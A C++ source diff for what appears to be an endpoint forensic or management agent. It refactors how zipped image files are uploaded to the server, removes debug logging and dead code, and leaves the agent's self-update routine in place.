@@ -2250,12 +2250,6 @@ int Task::GetImage(StrPacket* udata) {
 	swprintf_s(ServerIP, MAX_PATH, L"%hs", info->ServerIP);
 
 	swprintf_s(RunComStr, 1024, L"\"%s\" %s %d Image %hs", MyName, ServerIP, info->Port, udata->csMsg); // space may not be enough
-	wprintf(L"Run Process: %ls\n", RunComStr);
-
-	std::wstring wstrFilename(RunComStr);
-	std::string strFilename(wstrFilename.begin(), wstrFilename.end());
-	log.logger("Debug", strFilename);
-
 	RunProcessEx(RunExeStr, RunComStr, 1024, FALSE, FALSE, m_ImageProcessPid);
 
 	info->processMap["Image"] = m_ImageProcessPid;
@@ -2279,9 +2273,6 @@ void Task::SearchImageFile(std::vector<std::string>& parts, int level, string se
 	if (searchPath.find('*') == std::string::npos) {
 		searchPath += "*";
 	}
-
-	//string LogMsg = "search " + searchPath;
-	//log.logger("Debug", LogMsg);
 
 
 	WIN32_FIND_DATAA findFileData;
@@ -2370,18 +2361,17 @@ void Task::SearchImageFile(std::vector<std::string>& parts, int level, string se
 				destFile.close();
 				sourceFile.close();
 
-
-				wprintf(L"start add %s\n", destinationFileName);
 				if (ZipAdd(*hz, tcharFilename, destinationFileName) != 0) {
 					string cfilename = findFileData.cFileName;
 					string LogMsg = "failed to add " + cfilename + " to zip";
 					log.logger("Error", LogMsg);
 					continue;
 				}
-
-				string cfilename = findFileData.cFileName;
-				string LogMsg = "add " + cfilename + " to zip";
-				log.logger("Info", LogMsg);
+				else {
+					string cfilename = findFileData.cFileName;
+					string LogMsg = "add " + cfilename + " to zip";
+					log.logger("Info", LogMsg);
+				}
 
 				//return;
 			}
@@ -2397,10 +2387,9 @@ int Task::LookingForImage(char* cmd) {
 	_tcscat_s(zipFileName, MAX_PATH_EX, _T("\\image.zip"));
 	HZIP hz = CreateZip(zipFileName, 0);
 	if (hz == 0) {
-		printf("Failed to create image.zip\n");
+		log.logger("Error", "Failed to create image.zip");
 		return false; // Failed to create ZIP file
 	}
-
 
 	std::vector<std::string> MsgAfterSplit;
 	char* nextToken = nullptr;
@@ -2501,84 +2490,86 @@ int Task::LookingForImage(char* cmd) {
 	CloseZip(hz);
 
 
-	SendImageFileToServer(zipFileName, info->tcpSocket);
+	SendFileToServer("Image", zipFileName, info->tcpSocket);
 	return 1;
 	
 }
-void Task::SendImageFileToServer(const TCHAR* DBName, SOCKET* tcpSocket)
-{
-	HANDLE m_File = CreateFile(DBName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (m_File != INVALID_HANDLE_VALUE) {
-		DWORD m_Filesize = GetFileSize(m_File, NULL);
-		int Sendret;
-		char* InfoStr = new char[MAX_PATH_EX];
-		sprintf_s(InfoStr, MAX_PATH_EX, "%lu", m_Filesize);
-		char* TmpBuffer = new char[DATASTRINGMESSAGELEN];
-		memset(TmpBuffer, '\x0', DATASTRINGMESSAGELEN);
-		memcpy(TmpBuffer, InfoStr, strlen(InfoStr));
 
-		Sendret = GiveImageInfo(TmpBuffer, tcpSocket);
 
-		if (Sendret > 0)
-		{
-			DWORD readsize;
-			BYTE* buffer = new BYTE[m_Filesize];
-			ReadFile(m_File, buffer, m_Filesize, &readsize, NULL);
-			if (m_Filesize > DATASTRINGMESSAGELEN) {
-				DWORD tmplen = m_Filesize;
-				for (DWORD i = 0; i < m_Filesize; i += DATASTRINGMESSAGELEN) {
-					memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
-					if (tmplen < DATASTRINGMESSAGELEN) memcpy(TmpBuffer, buffer + i, tmplen);
-					else {
-						memcpy(TmpBuffer, buffer + i, DATASTRINGMESSAGELEN);
-						tmplen -= DATASTRINGMESSAGELEN;
-					}
-
-					Sendret = GiveImage(TmpBuffer, tcpSocket);
-					if (Sendret == 0 || Sendret == -1) break;
-				}
-				memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
-			}
-			else
-			{
-				memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
-				memcpy(TmpBuffer, buffer, m_Filesize);
-				Sendret = GiveImage(TmpBuffer, tcpSocket);
-				memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
-			}
-			delete[] buffer;
-		}
-		if (Sendret > 0)
-		{
-			memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
-			Sendret = GiveImageEnd(TmpBuffer, tcpSocket);
-			CloseHandle(m_File);
-
-		}
-	}
-	else
-	{
-		printf("image zip file not exists\n");
-	}
-}
-int Task::GiveImageInfo(char* buff, SOCKET* tcpSocket) {
-	char* functionName = new char[24];
-	strcpy_s(functionName, 24, "GiveImageInfo");
-	printf("%s\n", buff);
-	return socketsend->SendDataToServer(functionName, buff, tcpSocket);
-}
-int Task::GiveImage(char* buff, SOCKET* tcpSocket) {
-	char* functionName = new char[24];
-	strcpy_s(functionName, 24, "GiveImage");
-	printf("%s\n", buff);
-	return socketsend->SendDataToServer(functionName, buff, tcpSocket);
-}
-int Task::GiveImageEnd(char* buff, SOCKET* tcpSocket) {
-	char* functionName = new char[24];
-	strcpy_s(functionName, 24, "GiveImageEnd");
-	printf("%s\n", buff);
-	return socketsend->SendDataToServer(functionName, buff, tcpSocket);
-}
+//void Task::SendImageFileToServer(const TCHAR* DBName, SOCKET* tcpSocket)
+//{
+//	HANDLE m_File = CreateFile(DBName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+//	if (m_File != INVALID_HANDLE_VALUE) {
+//		DWORD m_Filesize = GetFileSize(m_File, NULL);
+//		int Sendret;
+//		char* InfoStr = new char[MAX_PATH_EX];
+//		sprintf_s(InfoStr, MAX_PATH_EX, "%lu", m_Filesize);
+//		char* TmpBuffer = new char[DATASTRINGMESSAGELEN];
+//		memset(TmpBuffer, '\x0', DATASTRINGMESSAGELEN);
+//		memcpy(TmpBuffer, InfoStr, strlen(InfoStr));
+//
+//		Sendret = GiveImageInfo(TmpBuffer, tcpSocket);
+//
+//		if (Sendret > 0)
+//		{
+//			DWORD readsize;
+//			BYTE* buffer = new BYTE[m_Filesize];
+//			ReadFile(m_File, buffer, m_Filesize, &readsize, NULL);
+//			if (m_Filesize > DATASTRINGMESSAGELEN) {
+//				DWORD tmplen = m_Filesize;
+//				for (DWORD i = 0; i < m_Filesize; i += DATASTRINGMESSAGELEN) {
+//					memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
+//					if (tmplen < DATASTRINGMESSAGELEN) memcpy(TmpBuffer, buffer + i, tmplen);
+//					else {
+//						memcpy(TmpBuffer, buffer + i, DATASTRINGMESSAGELEN);
+//						tmplen -= DATASTRINGMESSAGELEN;
+//					}
+//
+//					Sendret = GiveImage(TmpBuffer, tcpSocket);
+//					if (Sendret == 0 || Sendret == -1) break;
+//				}
+//				memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
+//			}
+//			else
+//			{
+//				memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
+//				memcpy(TmpBuffer, buffer, m_Filesize);
+//				Sendret = GiveImage(TmpBuffer, tcpSocket);
+//				memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
+//			}
+//			delete[] buffer;
+//		}
+//		if (Sendret > 0)
+//		{
+//			memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
+//			Sendret = GiveImageEnd(TmpBuffer, tcpSocket);
+//			CloseHandle(m_File);
+//
+//		}
+//	}
+//	else
+//	{
+//		printf("image zip file not exists\n");
+//	}
+//}
+//int Task::GiveImageInfo(char* buff, SOCKET* tcpSocket) {
+//	char* functionName = new char[24];
+//	strcpy_s(functionName, 24, "GiveImageInfo");
+//	printf("%s\n", buff);
+//	return socketsend->SendDataToServer(functionName, buff, tcpSocket);
+//}
+//int Task::GiveImage(char* buff, SOCKET* tcpSocket) {
+//	char* functionName = new char[24];
+//	strcpy_s(functionName, 24, "GiveImage");
+//	printf("%s\n", buff);
+//	return socketsend->SendDataToServer(functionName, buff, tcpSocket);
+//}
+//int Task::GiveImageEnd(char* buff, SOCKET* tcpSocket) {
+//	char* functionName = new char[24];
+//	strcpy_s(functionName, 24, "GiveImageEnd");
+//	printf("%s\n", buff);
+//	return socketsend->SendDataToServer(functionName, buff, tcpSocket);
+//}
 
 int Task::OpenUpdateAgentProcess(StrPacket* udata) {
 
@@ -2615,39 +2606,13 @@ void Task::WriteNewAgentToFile(char* buffer, int totalReceivedSize) {
 		log.logger("Error", "AgentNewVersion.exe open failed");
 	}
 	if (outFile.good()) { 
-		//int bufferSize = strlen(buffer) + 1;
-		//int wideBufferSize = MultiByteToWideChar(CP_UTF8, 0, buffer, bufferSize, nullptr, 0);
-		//wchar_t* wideBuffer = new wchar_t[wideBufferSize];
-		//MultiByteToWideChar(CP_UTF8, 0, buffer, bufferSize, wideBuffer, wideBufferSize);
-		//outFile.write(buffer, totalReceivedSize);
-
-		//outFile << buffer;
-
 		outFile.write(buffer, totalReceivedSize);
-
-		//if (totalReceivedSize == STRDATAPACKETSIZE - 100) {
-		//	std::string LogMsg = "equal: " + to_string(totalReceivedSize);
-		//	log.logger("Debug", LogMsg);
-		//	outFile << buffer;
-		//}
-		//else {
-		//	std::string LogMsg = "not equal: " + to_string(totalReceivedSize);
-		//	log.logger("Debug", LogMsg);
-		//	outFile.write(buffer, totalReceivedSize);
-		//}
-		
 	}
 	else {
 		log.logger("Error", "Error write data into NewAgent");
 	}
-
-	//AgentFile.write(buffer, totalReceivedSize);
-	//if (!AgentFile) {
-	//	log.logger("Error", "Error write data into NewAgent");
-	//}
 	outFile.close();
 	SendACK(null);
-	
 
 }
 void Task::AgentReceive(int fileSize) {
@@ -2665,80 +2630,23 @@ void Task::AgentReceive(int fileSize) {
 				log.logger("Error", "UpdateAgent Error receiving data");
 				return;
 			}
-
-		/*	std::stringstream sss;
-			for (char c : tmpbuffer) {
-				sss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(c);
-			}
-			std::string hexStrings = sss.str();
-			std::string LogMsgs = "Recv: " + hexStrings;
-			log.logger("Info", LogMsgs);*/
-
-			
-			
-			
-			/*std::this_thread::sleep_for(std::chrono::seconds(1));
-			log.logger("Debug", "bytesRead: " + to_string(bytesRead));*/
 			std::this_thread::sleep_for(std::chrono::milliseconds(500));
 			memcpy(buffer + totalReceivedSize, tmpbuffer, bytesRead);
-
-	/*		TCHAR* outputFile = new TCHAR[MAX_PATH_EX];
-			GetMyPath(outputFile);
-			_tcscat_s(outputFile, MAX_PATH_EX, _T("\\myFile.txt"));
-			DeleteFile(outputFile);
-			std::wofstream outFile(outputFile, std::ios::app);
-			outFile << buffer;
-			outFile.close();*/
-
-	/*		string buf(tmpbuffer);
-			std::this_thread::sleep_for(std::chrono::seconds(1));
-			log.logger("Debug", "buffer: " + buf);*/
 			totalReceivedSize += bytesRead;
 			alreadyReceived += bytesRead;
 
-			
-
-			
-			//memcpy(buffer, tmpbuffer, STRDATAPACKETSIZE - totalReceivedSize);
 		}
-
-		
-
-
 		alreadyReceived -= 100;
-		//log.logger("Debug", to_string(alreadyReceived) + " " + to_string(totalReceivedSize-100));
-
-		//int bytesRead = recv(*info->tcpSocket, buffer, sizeof(buffer), 0);
-		//if (bytesRead == -1) {
-		//	log.logger("Error", "UpdateAgent Error receiving data");
-		//	return;
-		//}
-
-		//log.logger("Info", buffer);
 
 		SetKeys(BIT128, AESKey);
 		DecryptBuffer((BYTE*)buffer, STRDATAPACKETSIZE);
 		StrDataPacket* udata;
 		udata = (StrDataPacket*)buffer;
-		std::string mac(udata->MAC);
-		std::string ip(udata->IP);
-		std::string uuid(udata->UUID);
+
 		std::string Task(udata->DoWorking);
 		std::string TaskMsg(udata->csMsg);
-		//std::string LogMsg = "Receive: " + Task + " " + TaskMsg;
-
 		std::string LogMsg = "Receive: " + Task;
 		log.logger("Info", LogMsg);
-
-	/*	std::stringstream ss;
-		for (char c : TaskMsg) {
-			ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(c);
-		}
-		std::string hexString = ss.str();
-		std::string LogMsg = "After hex: " + hexString;
-		log.logger("Info", LogMsg);*/
-
-		
 
 		if (!strcmp(udata->DoWorking, "GiveUpdate")) {
 			if (alreadyReceived > fileSize) {
@@ -2747,16 +2655,6 @@ void Task::AgentReceive(int fileSize) {
 			else {
 				WriteNewAgentToFile(udata->csMsg, STRDATAPACKETSIZE - 100);
 			}
-			/*std::thread WriteNewAgentToFileThread([&]() { WriteNewAgentToFile(udata->csMsg, totalReceivedSize - 100); });
-			WriteNewAgentToFileThread.detach();*/
-		/*	if (alreadyReceived > fileSize) {
-				std::thread WriteNewAgentToFileThread([&]() { WriteNewAgentToFile(udata->csMsg, alreadyReceived - fileSize); });
-				WriteNewAgentToFileThread.detach();
-			}
-			else {
-				std::thread WriteNewAgentToFileThread([&]() { WriteNewAgentToFile(udata->csMsg, totalReceivedSize); });
-				WriteNewAgentToFileThread.detach();
-			}*/
 			
 		}
 		else {
@@ -2777,6 +2675,7 @@ int Task::UpdateAgent() {
 	DeleteFile(AgentNewVersion_exe);
 
 	ReadyUpdateAgent(null);
+
 	int fileSize = GiveUpdateInfo();
 	std::thread AgentReceiveThread([&]() { AgentReceive(fileSize); });
 	if (!fileSize) {
@@ -2854,8 +2753,6 @@ int Task::GiveUpdateInfo() {
 	log.logger("Info", LogMsg);
 
 	if (!strcmp(udata->DoWorking, "GiveUpdateInfo")) {
-		//std::string LogMsg = to_string(std::stoi(TaskMsg));
-		//log.logger("Debug", LogMsg);
 		return std::stoi(TaskMsg);
 	}
 	else {
@@ -2913,6 +2810,7 @@ void Task::SendFileToServer(const char* feature, const TCHAR* FileName, SOCKET* 
 		memcpy(TmpBuffer, InfoStr, strlen(InfoStr));
 
 		if (!strcmp(feature, "Collect")) Sendret = SendDataPacketToServer("GiveCollectDataInfo", TmpBuffer, tcpSocket);
+		else if (!strcmp(feature, "Image")) Sendret = SendDataPacketToServer("GiveImageInfo", TmpBuffer, tcpSocket);
 
 		if (Sendret > 0)
 		{
@@ -2932,6 +2830,7 @@ void Task::SendFileToServer(const char* feature, const TCHAR* FileName, SOCKET* 
 					if (!strcmp(feature, "Scan")) Sendret = SendDataPacketToServer("GiveScan", TmpBuffer, tcpSocket);
 					else if (!strcmp(feature, "Explorer")) Sendret = SendDataPacketToServer("GiveExplorerData", TmpBuffer, tcpSocket);
 					else if (!strcmp(feature, "Collect")) Sendret = SendDataPacketToServer("GiveCollectData", TmpBuffer, tcpSocket);
+					else if (!strcmp(feature, "Image")) Sendret = SendDataPacketToServer("GiveImage", TmpBuffer, tcpSocket);
 					else log.logger("Error", "feature not found");
 
 					
@@ -2947,6 +2846,7 @@ void Task::SendFileToServer(const char* feature, const TCHAR* FileName, SOCKET* 
 				if (!strcmp(feature, "Scan")) Sendret = SendDataPacketToServer("GiveScan", TmpBuffer, tcpSocket);
 				else if (!strcmp(feature, "Explorer")) Sendret = SendDataPacketToServer("GiveExplorerData", TmpBuffer, tcpSocket);
 				else if (!strcmp(feature, "Collect")) Sendret = SendDataPacketToServer("GiveCollectData", TmpBuffer, tcpSocket);
+				else if (!strcmp(feature, "Image")) Sendret = SendDataPacketToServer("GiveImage", TmpBuffer, tcpSocket);
 				else log.logger("Error", "feature not found");
 
 				memset(TmpBuffer, '\x00', DATASTRINGMESSAGELEN);
@@ -2967,6 +2867,7 @@ void Task::SendFileToServer(const char* feature, const TCHAR* FileName, SOCKET* 
 				Sendret = SendDataPacketToServer("GiveCollectDataEnd", TmpBuffer, tcpSocket); 
 				tool.DeleteAllCsvFiles(m_Path);
 			}
+			else if (!strcmp(feature, "Image")) Sendret = SendDataPacketToServer("GiveImageEnd", TmpBuffer, tcpSocket);
 			else log.logger("Error", "feature not found");
 
 			CloseHandle(m_File);
